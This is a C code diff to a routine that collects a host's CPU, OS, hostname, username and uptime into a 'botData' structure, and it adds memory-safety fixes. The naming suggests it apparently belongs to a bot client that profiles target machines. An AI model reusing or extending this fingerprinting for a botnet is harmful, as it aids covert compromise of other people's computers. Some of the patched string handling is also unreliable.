@@ -185,8 +185,9 @@ C_Scroll fetchTargetInfo(int *payloadEncoderID) {
     */
 
     C_Scroll botData;
+    memset(&botData, 0, sizeof(botData));
     char cpuName[49];
-    unsigned int cores, threads, cache;
+    unsigned int cores = 0, threads = 0, cache = 0;
     double cpuClock = 0.0;
     char _cpuinfoLine[256];
 
@@ -241,19 +242,18 @@ C_Scroll fetchTargetInfo(int *payloadEncoderID) {
 
     }
 
-    memcpy(botData.CPU.Name, cpuName, strlen(cpuName));
+    strcpy(botData.CPU.Name, cpuName);
     botData.CPU.Cores = cores;
     botData.CPU.Threads = threads;
     botData.CPU.Cache = cache;
     botData.CPU.Clock = (int)cpuClock;
-    memcpy(botData.CPU.Arch, "x86", strlen("x86"));
+    strcpy(botData.CPU.Arch, "x86_64");
 
     FreeGoMem(_tmp_procCpuinfoPath);
 
-    char osHostname[256];
-    char osName[512];
-    char osVersion[512];
-    char *osArch = "x86";
+    char osHostname[128];
+    char osName[128];
+    char osVersion[128];
     char *osUsername;
     double osUptime;
 
@@ -291,8 +291,8 @@ C_Scroll fetchTargetInfo(int *payloadEncoderID) {
     char *_username = malloc(_limit);
     if (_username) {
         if (getlogin_r(_username, _limit) == 0) {
-            osUsername = malloc(strlen(_username));
-            memcpy(osUsername, _username, strlen(_username));
+            osUsername = malloc(strlen(_username) + 1);
+            strcpy(osUsername, _username);
 
         }
 
@@ -311,11 +311,11 @@ C_Scroll fetchTargetInfo(int *payloadEncoderID) {
 
     }
 
-    memcpy(botData.OS.Name, osName, 512);
-    memcpy(botData.OS.Version, osVersion, 512);
-    memcpy(botData.OS.Arch, osArch, strlen(osArch));
-    memcpy(botData.OS.Hostname, osHostname, 256);
-    memcpy(botData.OS.Username, osUsername, strlen(osUsername));
+    strcpy(botData.OS.Name, osName);
+    strcpy(botData.OS.Version, osVersion);
+    strcpy(botData.OS.Arch, "x86");
+    strcpy(botData.OS.Hostname, osHostname);
+    strcpy(botData.OS.Username, osUsername);
     botData.OS.Uptime = (int)osUptime;
 
     free(osUsername);
